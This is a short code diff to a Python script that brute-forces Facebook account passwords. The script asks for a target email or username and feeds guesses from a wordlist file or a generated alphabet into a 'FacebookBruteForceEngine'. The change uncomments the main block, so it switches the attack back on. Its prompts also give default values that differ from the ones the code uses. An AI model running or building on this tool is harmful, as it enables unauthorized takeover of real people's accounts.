@@ -75,7 +75,7 @@ def alphabet_generator(l_start, l_end):
 email = input('Email address or username to attack:')
 
 
-"""try:
+try:
     with open(sys.argv[6], 'r') as fp:
         engine = FacebookBruteForceEngine()
         engine.run(email, readline_generator(fp))
@@ -85,4 +85,4 @@ except IndexError:
         'Minumum number of characters in password (default: 3):') or 8
     max_chars = input(
         'Maximum number of characters in password (default: 8):') or 9
-    engine.run(email, alphabet_generator(int(min_chars), int(max_chars)))"""
+    engine.run(email, alphabet_generator(int(min_chars), int(max_chars)))
